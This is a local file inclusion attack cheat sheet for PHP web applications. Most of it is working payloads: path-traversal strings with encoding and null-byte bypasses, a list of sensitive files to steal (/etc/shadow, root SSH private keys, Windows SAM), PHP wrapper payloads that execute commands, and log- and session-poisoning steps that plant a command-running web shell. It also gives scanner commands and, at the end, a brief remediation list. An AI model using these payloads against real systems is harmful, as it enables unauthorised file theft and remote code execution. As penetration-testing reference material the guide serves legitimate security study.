# LFI / File Inclusion — Complete Attack Guide

## 1. Detection

### Basic LFI
```
../../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//....//etc/passwd
```

### URL Encoding
```
..%2f..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Double Encoding
```
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Null Byte (older PHP)
```
../../../../etc/passwd%00
```

### UTF-8 Overlong
```
..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
```

## 2. Interesting Files

### Linux
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/crontab
/etc/environment
/proc/self/environ
/proc/self/cmdline
/proc/version
/proc/net/tcp
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/root/.bash_history
/root/.ssh/id_rsa
/home/{user}/.bash_history
/home/{user}/.ssh/id_rsa
```

### Windows
```
c:\windows\win.ini
c:\windows\system32\drivers\etc\hosts
c:\windows\system32\config\sam
c:\inetpub\wwwroot\web.config
c:\windows\repair\sam
c:\windows\panther\unattend.xml
```

## 3. PHP Wrappers

### Base64 Encode
```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
```

### PHP Input
```
php://input
POST: <?php system('id'); ?>
```

### Data URI
```
data://text/plain,<?php system('id')?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpPz4=
```

### Expect
```
expect://id
```

### Zip
```
zip://shell.jpg%23shell.php
```

### Phar
```
phar://shell.zip/shell.php
```

## 4. Log Poisoning → RCE

### 4.1 Apache Log Poisoning
```
1. Inject PHP into User-Agent:
   User-Agent: <?php system($_GET['cmd']);?>

2. Include Apache log:
   ../../../../var/log/apache2/access.log&cmd=id
```

### 4.2 SSH Log Poisoning
```
1. SSH with malicious username:
   ssh '<?php system($_GET["cmd"]);?>'@target

2. Include auth log:
   ../../../../var/log/auth.log&cmd=id
```

### 4.3 PHP Session Poisoning
```
1. Set PHPSESSID to contain PHP code:
   <?php system($_GET['cmd']);?>

2. Include session file:
   ../../../../tmp/sess_{PHPSESSID}&cmd=id
```

## 5. Path Traversal Bypass

### 5.1 Strip Dots
```
....//....//....//....//etc/passwd
```

### 5.2 URL Encoding
```
..%2f..%2f..%2f..%2fetc/passwd
```

### 5.3 Double URL Encoding
```
%252e%252e%252f
```

### 5.4 UTF-8 Overlong
```
..%c0%af..%c0%af
```

### 5.5 Null Byte
```
../../../../etc/passwd%00.jpg
```

### 5.6 Absolute Path
```
/etc/passwd (if relative path check is bypassed)
```

## 6. Tools

### fimap
```bash
fimap -u "http://target/page?file=test"
```

### lfimap
```bash
lfimap -u "http://target/page?file=test"
```

### nuclei
```bash
nuclei -u http://target -tags lfi
```

## 7. Remediation

1. **Whitelist allowed files** — Don't use user input in file paths
2. **Use basename()** — Strip directory components
3. **Chroot/jail** — Restrict file access to specific directory
4. **Disable dangerous wrappers** — php://, data://, expect://
5. **Input validation** — Block path traversal characters
